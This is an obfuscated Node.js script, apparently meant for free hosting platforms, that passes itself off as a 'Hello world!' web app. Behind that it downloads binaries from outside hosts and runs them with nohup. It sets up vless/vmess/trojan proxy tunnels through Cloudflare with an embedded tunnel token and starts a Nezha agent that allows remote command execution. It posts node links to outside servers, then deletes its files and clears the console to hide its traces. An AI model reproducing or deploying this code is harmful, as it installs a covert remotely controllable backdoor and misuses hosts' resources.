const _0x5a37ef=_0x1705;(function(_0x210395,_0x3a446a){const _0x1b40e0=_0x1705,_0x1b3b3f=_0x210395();while(!![]){try{const _0x726c5e=-parseInt(_0x1b40e0(0xed))/0x1+-parseInt(_0x1b40e0(0x107))/0x2+parseInt(_0x1b40e0(0xe9))/0x3+-parseInt(_0x1b40e0(0xf3))/0x4*(-parseInt(_0x1b40e0(0xff))/0x5)+-parseInt(_0x1b40e0(0x13f))/0x6*(-parseInt(_0x1b40e0(0xfb))/0x7)+parseInt(_0x1b40e0(0x102))/0x8*(parseInt(_0x1b40e0(0x159))/0x9)+parseInt(_0x1b40e0(0x134))/0xa*(-parseInt(_0x1b40e0(0x103))/0xb);if(_0x726c5e===_0x3a446a)break;else _0x1b3b3f['push'](_0x1b3b3f['shift']());}catch(_0x3035a6){_0x1b3b3f['push'](_0x1b3b3f['shift']());}}}(_0x1f80,0xe079f));const express=require('express'),app=express(),axios=require(_0x5a37ef(0x116)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x5a37ef(0x153)),exec=promisify(require('child_process')[_0x5a37ef(0x1a5)]),{execSync}=require(_0x5a37ef(0x10e)),UPLOAD_URL=process[_0x5a37ef(0x121)][_0x5a37ef(0x190)]||'',PROJECT_URL=process[_0x5a37ef(0x121)][_0x5a37ef(0x11d)]||'',AUTO_ACCESS=process['env'][_0x5a37ef(0x199)]||![],FILE_PATH=process['env']['FILE_PATH']||_0x5a37ef(0x183),SUB_PATH=process[_0x5a37ef(0x121)][_0x5a37ef(0x11c)]||_0x5a37ef(0x168),PORT=process[_0x5a37ef(0x121)][_0x5a37ef(0x184)]||process[_0x5a37ef(0x121)]['PORT']||0xbb8,UUID=process[_0x5a37ef(0x121)][_0x5a37ef(0x133)]||'cdbb92ae-6b4c-4174-b095-a9f26555e1af',NEZHA_SERVER=process[_0x5a37ef(0x121)][_0x5a37ef(0x117)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x5a37ef(0x121)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x5a37ef(0x121)][_0x5a37ef(0x146)]||'note.a.c.c.2.0.6.3.0.0.0.7.4.0.1.0.0.2.ip6.arpa',ARGO_AUTH=process[_0x5a37ef(0x121)][_0x5a37ef(0x182)]||_0x5a37ef(0x18f),ARGO_PORT=process[_0x5a37ef(0x121)]['ARGO_PORT']||0x1f41,CFIP=process[_0x5a37ef(0x121)][_0x5a37ef(0x16a)]||'cdns.doon.eu.org',CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x5a37ef(0x121)][_0x5a37ef(0x160)]||'congfigil1ng';function _0x1705(_0x5eb5f6,_0x161d2d){_0x5eb5f6=_0x5eb5f6-0xe7;const _0x1f80f9=_0x1f80();let _0x1705dd=_0x1f80f9[_0x5eb5f6];return _0x1705dd;}!fs[_0x5a37ef(0x151)](FILE_PATH)?(fs[_0x5a37ef(0x106)](FILE_PATH),console[_0x5a37ef(0xf1)](FILE_PATH+_0x5a37ef(0x152))):console['log'](FILE_PATH+_0x5a37ef(0x18a));function generateRandomName(){const _0x23cd8b=_0x5a37ef,_0x378f75=_0x23cd8b(0x144);let _0x288d99='';for(let _0x375adb=0x0;_0x375adb<0x6;_0x375adb++){_0x288d99+=_0x378f75[_0x23cd8b(0x10d)](Math[_0x23cd8b(0x17a)](Math[_0x23cd8b(0x158)]()*_0x378f75[_0x23cd8b(0x13e)]));}return _0x288d99;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5a37ef(0x135)](FILE_PATH,npmName),phpPath=path[_0x5a37ef(0x135)](FILE_PATH,phpName),webPath=path[_0x5a37ef(0x135)](FILE_PATH,webName),botPath=path[_0x5a37ef(0x135)](FILE_PATH,botName),subPath=path[_0x5a37ef(0x135)](FILE_PATH,_0x5a37ef(0x194)),listPath=path[_0x5a37ef(0x135)](FILE_PATH,_0x5a37ef(0x178)),bootLogPath=path[_0x5a37ef(0x135)](FILE_PATH,_0x5a37ef(0xf6)),configPath=path[_0x5a37ef(0x135)](FILE_PATH,_0x5a37ef(0x13c));function deleteNodes(){const _0x1d0e9f=_0x5a37ef;try{if(!UPLOAD_URL)return;if(!fs[_0x1d0e9f(0x151)](subPath))return;let _0x3afc30;try{_0x3afc30=fs['readFileSync'](subPath,_0x1d0e9f(0x127));}catch{return null;}const _0x283693=Buffer[_0x1d0e9f(0x118)](_0x3afc30,_0x1d0e9f(0x193))[_0x1d0e9f(0x109)]('utf-8'),_0x52375e=_0x283693['split']('\x0a')['filter'](_0x9881a7=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1d0e9f(0x162)](_0x9881a7));if(_0x52375e[_0x1d0e9f(0x13e)]===0x0)return;return axios[_0x1d0e9f(0x147)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x1d0e9f(0xfe)]({'nodes':_0x52375e}),{'headers':{'Content-Type':_0x1d0e9f(0x124)}})[_0x1d0e9f(0x130)](_0xb8e796=>{return null;}),null;}catch(_0x5b9ecc){return null;}}function cleanupOldFiles(){const _0x2618e7=_0x5a37ef;try{const _0xa58ae0=fs[_0x2618e7(0x142)](FILE_PATH);_0xa58ae0[_0x2618e7(0x12b)](_0x5c882d=>{const _0x3e98be=_0x2618e7,_0x5aec29=path['join'](FILE_PATH,_0x5c882d);try{const _0x23f7e2=fs[_0x3e98be(0x119)](_0x5aec29);_0x23f7e2[_0x3e98be(0x10c)]()&&fs[_0x3e98be(0xf9)](_0x5aec29);}catch(_0x3eceec){}});}catch(_0x80f640){}}app[_0x5a37ef(0x166)]('/',function(_0x4279a8,_0x2f31be){const _0xfb491c=_0x5a37ef;_0x2f31be[_0xfb491c(0x169)](_0xfb491c(0xfc));});async function generateConfig(){const _0x4b8fbf=_0x5a37ef,_0x123902={'log':{'access':_0x4b8fbf(0x174),'error':'/dev/null','loglevel':_0x4b8fbf(0x19d)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4b8fbf(0x14b),'settings':{'clients':[{'id':UUID,'flow':_0x4b8fbf(0x181)}],'decryption':_0x4b8fbf(0x19d),'fallbacks':[{'dest':0xbb9},{'path':_0x4b8fbf(0x15d),'dest':0xbba},{'path':_0x4b8fbf(0x141),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x4b8fbf(0x19c)}},{'port':0xbb9,'listen':_0x4b8fbf(0x191),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x4b8fbf(0x19c),'security':_0x4b8fbf(0x19d)}},{'port':0xbba,'listen':_0x4b8fbf(0x191),'protocol':_0x4b8fbf(0x14b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x4b8fbf(0x19d),'wsSettings':{'path':_0x4b8fbf(0x15d)}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4b8fbf(0x191),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4b8fbf(0x1a1),_0x4b8fbf(0x16d),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4b8fbf(0x191),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x4b8fbf(0xee)}},'sniffing':{'enabled':!![],'destOverride':[_0x4b8fbf(0x1a1),_0x4b8fbf(0x16d),_0x4b8fbf(0xe8)],'metadataOnly':![]}}],'dns':{'servers':[_0x4b8fbf(0x149)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x4b8fbf(0x120),'tag':'block'}]};fs[_0x4b8fbf(0x163)](path[_0x4b8fbf(0x135)](FILE_PATH,_0x4b8fbf(0x13c)),JSON[_0x4b8fbf(0xfe)](_0x123902,null,0x2));}function getSystemArchitecture(){const _0x7840f=_0x5a37ef,_0x470532=os[_0x7840f(0x131)]();return _0x470532===_0x7840f(0x15b)||_0x470532===_0x7840f(0x17c)||_0x470532===_0x7840f(0x16f)?_0x7840f(0x15b):_0x7840f(0x18e);}function downloadFile(_0x423b2,_0x814f16,_0x42401a){const _0x41b250=_0x5a37ef,_0x1c2a6a=_0x423b2;!fs[_0x41b250(0x151)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x36badc=fs[_0x41b250(0xfa)](_0x1c2a6a);axios({'method':_0x41b250(0x166),'url':_0x814f16,'responseType':_0x41b250(0xf7)})['then'](_0x413ab9=>{const _0x5c820a=_0x41b250;_0x413ab9['data']['pipe'](_0x36badc),_0x36badc['on'](_0x5c820a(0x15a),()=>{const _0x5d6b68=_0x5c820a;_0x36badc[_0x5d6b68(0x161)](),console['log'](_0x5d6b68(0x18d)+path['basename'](_0x1c2a6a)+_0x5d6b68(0xeb)),_0x42401a(null,_0x1c2a6a);}),_0x36badc['on'](_0x5c820a(0xef),_0x5e1833=>{const _0x3abee3=_0x5c820a;fs['unlink'](_0x1c2a6a,()=>{});const _0x1cc1a7=_0x3abee3(0x18d)+path[_0x3abee3(0x14d)](_0x1c2a6a)+_0x3abee3(0x1a3)+_0x5e1833[_0x3abee3(0x15c)];console[_0x3abee3(0xef)](_0x1cc1a7),_0x42401a(_0x1cc1a7);});})[_0x41b250(0x130)](_0x5e6c94=>{const _0x124954=_0x41b250,_0x3bb411=_0x124954(0x18d)+path[_0x124954(0x14d)](_0x1c2a6a)+_0x124954(0x1a3)+_0x5e6c94[_0x124954(0x15c)];console[_0x124954(0xef)](_0x3bb411),_0x42401a(_0x3bb411);});}async function downloadFilesAndRun(){const _0x2708db=_0x5a37ef,_0x2eee59=getSystemArchitecture(),_0x373138=getFilesForArchitecture(_0x2eee59);if(_0x373138[_0x2708db(0x13e)]===0x0){console['log'](_0x2708db(0x12a));return;}const _0x439295=_0x373138['map'](_0x4267ff=>{return new Promise((_0x13f20f,_0x2e9a26)=>{const _0x1c7dc8=_0x1705;downloadFile(_0x4267ff['fileName'],_0x4267ff[_0x1c7dc8(0x1a6)],(_0x5e2564,_0x1f9cfd)=>{_0x5e2564?_0x2e9a26(_0x5e2564):_0x13f20f(_0x1f9cfd);});});});try{await Promise['all'](_0x439295);}catch(_0x717486){console[_0x2708db(0xef)](_0x2708db(0x18c),_0x717486);return;}function _0x48188e(_0x171350){const _0x42d255=_0x2708db,_0x235485=0x1fd;_0x171350[_0x42d255(0x12b)](_0x301c81=>{const _0x382c45=_0x42d255;fs[_0x382c45(0x151)](_0x301c81)&&fs[_0x382c45(0x122)](_0x301c81,_0x235485,_0x390e64=>{const _0x146faa=_0x382c45;_0x390e64?console['error'](_0x146faa(0x19a)+_0x301c81+':\x20'+_0x390e64):console[_0x146faa(0xf1)](_0x146faa(0x1a7)+_0x301c81+':\x20'+_0x235485[_0x146faa(0x109)](0x8));});});}const _0x30f8d6=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x48188e(_0x30f8d6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x29fb02=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x2708db(0x173)](':')[_0x2708db(0x164)]():'',_0x59b61e=new Set([_0x2708db(0x126),_0x2708db(0x192),'2096',_0x2708db(0x11b),'2083',_0x2708db(0xf8)]),_0x2abbbb=_0x59b61e[_0x2708db(0xec)](_0x29fb02)?_0x2708db(0x132):_0x2708db(0x150),_0x1a7ce5=_0x2708db(0x179)+NEZHA_KEY+_0x2708db(0x114)+NEZHA_SERVER+_0x2708db(0x100)+_0x2abbbb+_0x2708db(0x101)+UUID;fs[_0x2708db(0x163)](path[_0x2708db(0x135)](FILE_PATH,'config.yaml'),_0x1a7ce5);const _0x4a0833=_0x2708db(0x111)+phpPath+_0x2708db(0x12e)+FILE_PATH+_0x2708db(0x195);try{await exec(_0x4a0833),console[_0x2708db(0xf1)](phpName+_0x2708db(0x14f)),await new Promise(_0x582286=>setTimeout(_0x582286,0x3e8));}catch(_0x145edc){console[_0x2708db(0xef)](_0x2708db(0x170)+_0x145edc);}}else{let _0x593eba='';const _0x1158dc=[_0x2708db(0x126),_0x2708db(0x192),'2096',_0x2708db(0x11b),_0x2708db(0x138),_0x2708db(0xf8)];_0x1158dc['includes'](NEZHA_PORT)&&(_0x593eba=_0x2708db(0x13a));const _0x190fd0='nohup\x20'+npmPath+_0x2708db(0x156)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2708db(0x104)+NEZHA_KEY+'\x20'+_0x593eba+_0x2708db(0xf5);try{await exec(_0x190fd0),console[_0x2708db(0xf1)](npmName+_0x2708db(0x14f)),await new Promise(_0x5f440f=>setTimeout(_0x5f440f,0x3e8));}catch(_0x3645aa){console[_0x2708db(0xef)]('npm\x20running\x20error:\x20'+_0x3645aa);}}}else console[_0x2708db(0xf1)](_0x2708db(0x113));const _0x552a99=_0x2708db(0x111)+webPath+_0x2708db(0x140)+FILE_PATH+_0x2708db(0x13b);try{await exec(_0x552a99),console[_0x2708db(0xf1)](webName+_0x2708db(0x14f)),await new Promise(_0xd315d7=>setTimeout(_0xd315d7,0x3e8));}catch(_0x29fa0c){console[_0x2708db(0xef)](_0x2708db(0xf2)+_0x29fa0c);}if(fs['existsSync'](botPath)){let _0x180e94;if(ARGO_AUTH[_0x2708db(0x14e)](/^[A-Z0-9a-z=]{120,250}$/))_0x180e94='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x180e94='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x2708db(0x155):_0x180e94=_0x2708db(0xf0)+FILE_PATH+_0x2708db(0xfd)+ARGO_PORT;try{await exec(_0x2708db(0x111)+botPath+'\x20'+_0x180e94+_0x2708db(0x18b)),console[_0x2708db(0xf1)](botName+_0x2708db(0x14f)),await new Promise(_0x7d6507=>setTimeout(_0x7d6507,0x7d0));}catch(_0xb0daf4){console['error'](_0x2708db(0x167)+_0xb0daf4);}}await new Promise(_0x1fe7cb=>setTimeout(_0x1fe7cb,0x1388));}function getFilesForArchitecture(_0x14d87c){const _0x59aa63=_0x5a37ef;let _0xa36831;_0x14d87c==='arm'?_0xa36831=[{'fileName':webPath,'fileUrl':_0x59aa63(0x136)},{'fileName':botPath,'fileUrl':_0x59aa63(0x172)}]:_0xa36831=[{'fileName':webPath,'fileUrl':_0x59aa63(0x129)},{'fileName':botPath,'fileUrl':_0x59aa63(0x10a)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5b494b=_0x14d87c===_0x59aa63(0x15b)?_0x59aa63(0x145):_0x59aa63(0x128);_0xa36831[_0x59aa63(0x139)]({'fileName':npmPath,'fileUrl':_0x5b494b});}else{const _0x4d5943=_0x14d87c===_0x59aa63(0x15b)?_0x59aa63(0x189):_0x59aa63(0x105);_0xa36831[_0x59aa63(0x139)]({'fileName':phpPath,'fileUrl':_0x4d5943});}}return _0xa36831;}function argoType(){const _0x1baef3=_0x5a37ef;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1baef3(0xf1)](_0x1baef3(0x177));return;}if(ARGO_AUTH[_0x1baef3(0x112)](_0x1baef3(0x176))){fs['writeFileSync'](path[_0x1baef3(0x135)](FILE_PATH,_0x1baef3(0x15e)),ARGO_AUTH);const _0x4f9e03=_0x1baef3(0x115)+ARGO_AUTH['split']('\x22')[0xb]+_0x1baef3(0x11a)+path[_0x1baef3(0x135)](FILE_PATH,'tunnel.json')+_0x1baef3(0x14a)+ARGO_DOMAIN+_0x1baef3(0x148)+ARGO_PORT+_0x1baef3(0x12c);fs[_0x1baef3(0x163)](path[_0x1baef3(0x135)](FILE_PATH,_0x1baef3(0x12d)),_0x4f9e03);}else console[_0x1baef3(0xf1)](_0x1baef3(0x19f));}argoType();async function extractDomains(){const _0x3e62ee=_0x5a37ef;let _0x2aeb71;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2aeb71=ARGO_DOMAIN,console['log'](_0x3e62ee(0x19e),_0x2aeb71),await _0xe5063f(_0x2aeb71);else try{const _0x446111=fs[_0x3e62ee(0x185)](path[_0x3e62ee(0x135)](FILE_PATH,'boot.log'),_0x3e62ee(0x127)),_0xe7e151=_0x446111[_0x3e62ee(0x173)]('\x0a'),_0x3b4467=[];_0xe7e151['forEach'](_0x4b00b2=>{const _0x33fcdc=_0x3e62ee,_0x36de50=_0x4b00b2[_0x33fcdc(0x14e)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x36de50){const _0x2e7d0a=_0x36de50[0x1];_0x3b4467['push'](_0x2e7d0a);}});if(_0x3b4467[_0x3e62ee(0x13e)]>0x0)_0x2aeb71=_0x3b4467[0x0],console[_0x3e62ee(0xf1)](_0x3e62ee(0x154),_0x2aeb71),await _0xe5063f(_0x2aeb71);else{console[_0x3e62ee(0xf1)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x3e62ee(0x135)](FILE_PATH,_0x3e62ee(0xf6)));async function _0x280e99(){const _0x26cdcc=_0x3e62ee;try{process['platform']===_0x26cdcc(0x1a2)?await exec(_0x26cdcc(0x143)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x26cdcc(0x137)+botName[_0x26cdcc(0x10d)](0x0)+']'+botName['substring'](0x1)+_0x26cdcc(0x17e));}catch(_0x4ee815){}}_0x280e99(),await new Promise(_0x50afc9=>setTimeout(_0x50afc9,0xbb8));const _0x4c8371='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3e62ee(0xfd)+ARGO_PORT;try{await exec(_0x3e62ee(0x111)+botPath+'\x20'+_0x4c8371+_0x3e62ee(0x18b)),console['log'](botName+_0x3e62ee(0x14f)),await new Promise(_0x42025b=>setTimeout(_0x42025b,0xbb8)),await extractDomains();}catch(_0xf577ac){console[_0x3e62ee(0xef)](_0x3e62ee(0x167)+_0xf577ac);}}}catch(_0x2cca3b){console[_0x3e62ee(0xef)](_0x3e62ee(0x198),_0x2cca3b);}async function _0xe5063f(_0x4c6011){const _0x2ced92=_0x3e62ee,_0x1a8acc=execSync(_0x2ced92(0x17b),{'encoding':_0x2ced92(0x127)}),_0x5b5a37=_0x1a8acc[_0x2ced92(0x196)](),_0x3f7bc7=NAME?NAME+'-'+_0x5b5a37:_0x5b5a37;return new Promise(_0x2e5098=>{setTimeout(()=>{const _0xc45652=_0x1705,_0x20841b={'v':'2','ps':''+_0x3f7bc7,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0xc45652(0x19d),'host':_0x4c6011,'path':_0xc45652(0x10f),'tls':'tls','sni':_0x4c6011,'alpn':'','fp':_0xc45652(0xea)},_0x29ba37='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0xc45652(0x11f)+_0x4c6011+'&fp=firefox&type=ws&host='+_0x4c6011+_0xc45652(0x125)+_0x3f7bc7+_0xc45652(0x175)+Buffer[_0xc45652(0x118)](JSON[_0xc45652(0xfe)](_0x20841b))['toString'](_0xc45652(0x193))+_0xc45652(0x16b)+UUID+'@'+CFIP+':'+CFPORT+_0xc45652(0x188)+_0x4c6011+_0xc45652(0x197)+_0x4c6011+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x3f7bc7+_0xc45652(0x165);console[_0xc45652(0xf1)](Buffer[_0xc45652(0x118)](_0x29ba37)['toString'](_0xc45652(0x193))),fs[_0xc45652(0x163)](subPath,Buffer[_0xc45652(0x118)](_0x29ba37)[_0xc45652(0x109)]('base64')),console[_0xc45652(0xf1)](FILE_PATH+_0xc45652(0x13d)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x4abe7f,_0x2c0229)=>{const _0x571655=_0xc45652,_0x3dbef8=Buffer[_0x571655(0x118)](_0x29ba37)[_0x571655(0x109)](_0x571655(0x193));_0x2c0229[_0x571655(0x171)](_0x571655(0x17d),_0x571655(0x10b)),_0x2c0229[_0x571655(0x169)](_0x3dbef8);}),_0x2e5098(_0x29ba37);},0x7d0);});}}async function uploadNodes(){const _0x3acce8=_0x5a37ef;if(UPLOAD_URL&&PROJECT_URL){const _0x2fa8f4=PROJECT_URL+'/'+SUB_PATH,_0x321e37={'subscription':[_0x2fa8f4]};try{const _0x43de20=await axios['post'](UPLOAD_URL+_0x3acce8(0x186),_0x321e37,{'headers':{'Content-Type':_0x3acce8(0x124)}});return _0x43de20&&_0x43de20['status']===0xc8?(console[_0x3acce8(0xf1)](_0x3acce8(0x19b)),_0x43de20):null;}catch(_0x2c07ce){if(_0x2c07ce[_0x3acce8(0x1a0)]){if(_0x2c07ce[_0x3acce8(0x1a0)][_0x3acce8(0x123)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3acce8(0x151)](listPath))return;const _0x58139a=fs['readFileSync'](listPath,'utf-8'),_0x292d29=_0x58139a[_0x3acce8(0x173)]('\x0a')[_0x3acce8(0x15f)](_0x15d644=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x15d644));if(_0x292d29['length']===0x0)return;const _0x47ba04=JSON[_0x3acce8(0xfe)]({'nodes':_0x292d29});try{const _0x23d087=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x47ba04,{'headers':{'Content-Type':_0x3acce8(0x124)}});return _0x23d087&&_0x23d087[_0x3acce8(0x123)]===0xc8?(console[_0x3acce8(0xf1)](_0x3acce8(0x157)),_0x23d087):null;}catch(_0x14f31f){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x539bb8=_0x1705,_0x32c561=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x32c561[_0x539bb8(0x108)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x32c561[_0x539bb8(0x108)](phpPath);process['platform']===_0x539bb8(0x1a2)?exec(_0x539bb8(0x180)+_0x32c561['join']('\x20')+'\x20>\x20nul\x202>&1',_0x5a59fe=>{const _0x2c526d=_0x539bb8;console[_0x2c526d(0x1a8)](),console[_0x2c526d(0xf1)](_0x2c526d(0x14c)),console[_0x2c526d(0xf1)](_0x2c526d(0x187));}):exec(_0x539bb8(0x16e)+_0x32c561[_0x539bb8(0x135)]('\x20')+_0x539bb8(0xe7),_0x450abc=>{const _0x101ff0=_0x539bb8;console['clear'](),console[_0x101ff0(0xf1)](_0x101ff0(0x14c)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x109f57=_0x5a37ef;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x109f57(0x11e));return;}try{const _0x10b5c8=await axios[_0x109f57(0x147)](_0x109f57(0x110),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x109f57(0x124)}});return console[_0x109f57(0xf1)](_0x109f57(0x16c)),_0x10b5c8;}catch(_0x3f38d6){return console[_0x109f57(0xef)](_0x109f57(0x17f)+_0x3f38d6[_0x109f57(0x15c)]),null;}}async function startserver(){const _0x27789b=_0x5a37ef;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4ed0ae){console[_0x27789b(0xef)](_0x27789b(0x12f),_0x4ed0ae);}}function _0x1f80(){const _0x340bf5=['taskkill\x20/f\x20/im\x20','abcdefghijklmnopqrstuvwxyz','https://arm64.ssss.nyc.mn/agent','ARGO_DOMAIN','post','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https+local://8.8.8.8/dns-query','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','vless','App\x20is\x20running','basename','match','\x20is\x20running','false','existsSync','\x20is\x20created','util','ArgoDomain:','/tunnel.yml\x20run','\x20-s\x20','Nodes\x20uploaded\x20successfully','random','9YeNqYO','finish','arm','message','/vless-argo','tunnel.json','filter','NAME','close','test','writeFileSync','pop','\x0a\x20\x20\x20\x20','get','Error\x20executing\x20command:\x20','config','send','CFIP','\x0a\x20\x20\x0atrojan://','automatic\x20access\x20task\x20added\x20successfully','tls','rm\x20-rf\x20','aarch64','php\x20running\x20error:\x20','set','https://arm64.ssss.nyc.mn/bot','split','/dev/null','\x0a\x20\x20\x0avmess://','TunnelSecret','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','list.txt','\x0aclient_secret:\x20','floor','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','arm64','Content-Type','\x22\x20>\x20/dev/null\x202>&1','Add\x20automatic\x20access\x20task\x20faild:\x20','del\x20/f\x20/q\x20','xtls-rprx-vision','ARGO_AUTH','./tmp','SERVER_PORT','readFileSync','/api/add-subscriptions','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','?security=tls&sni=','https://arm64.ssss.nyc.mn/v1','\x20already\x20exists','\x20>/dev/null\x202>&1\x20&','Error\x20downloading\x20files:','Download\x20','amd','eyJhIjoiNjdkN2E5OGY1ODkxNDRhZTVjZjFlZTM3ZDc5Y2VhOTUiLCJ0IjoiOTc2MzA0ZDItM2UxNS00ZThjLWFhNWMtYTUxN2JhZjc4NzlkIiwicyI6Ill6YzVORGRpTnpZdFl6ZGtPUzAwTVRJMUxUZzBaVGN0Tm1aaE1qRmhOMlF5T0dOayJ9','UPLOAD_URL','127.0.0.1','8443','base64','sub.txt','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','trim','&fp=firefox&type=ws&host=','Error\x20reading\x20boot.log:','AUTO_ACCESS','Empowerment\x20failed\x20for\x20','Subscription\x20uploaded\x20successfully','tcp','none','ARGO_DOMAIN:','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','response','http','win32','\x20failed:\x20','listen','exec','fileUrl','Empowerment\x20success\x20for\x20','clear','\x20>/dev/null\x202>&1','quic','359334XNxtQK','firefox','\x20successfully','has','1312921TNAEMR','/trojan-argo','error','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','log','web\x20running\x20error:\x20','320fUMdMN','http\x20server\x20is\x20running\x20on\x20port:','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','boot.log','stream','2053','unlinkSync','createWriteStream','2225013JAFVqL','Hello\x20world!','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','stringify','114710VLOJyI','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','1721744UgCHUX','457237PfRLug','\x20-p\x20','https://amd64.ssss.nyc.mn/v1','mkdirSync','2472612ZBeLvw','push','toString','https://amd64.ssss.nyc.mn/bot','text/plain;\x20charset=utf-8','isFile','charAt','child_process','/vmess-argo?ed=2560','https://oooo.serv00.net/add-url','nohup\x20','includes','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0a\x20\x20tunnel:\x20','axios','NEZHA_SERVER','from','statSync','\x0a\x20\x20credentials-file:\x20','2087','SUB_PATH','PROJECT_URL','Skipping\x20adding\x20automatic\x20access\x20task','?encryption=none&security=tls&sni=','blackhole','env','chmod','status','application/json','&path=%2Fvless-argo%3Fed%3D2560#','443','utf-8','https://amd64.ssss.nyc.mn/agent','https://amd64.ssss.nyc.mn/web','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','forEach','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','tunnel.yml','\x20-c\x20\x22','Error\x20in\x20startserver:','catch','arch','true','UUID','70IYOUnm','join','https://arm64.ssss.nyc.mn/web','pkill\x20-f\x20\x22[','2083','unshift','--tls','/config.json\x20>/dev/null\x202>&1\x20&','config.json','/sub.txt\x20saved\x20successfully','length','30eakeLj','\x20-c\x20','/vmess-argo','readdirSync'];_0x1f80=function(){return _0x340bf5;};return _0x1f80();}startserver()['catch'](_0x2fc67c=>{const _0x212cfa=_0x5a37ef;console[_0x212cfa(0xef)]('Unhandled\x20error\x20in\x20startserver:',_0x2fc67c);}),app[_0x5a37ef(0x1a4)](PORT,()=>console['log'](_0x5a37ef(0xf4)+PORT+'!'));
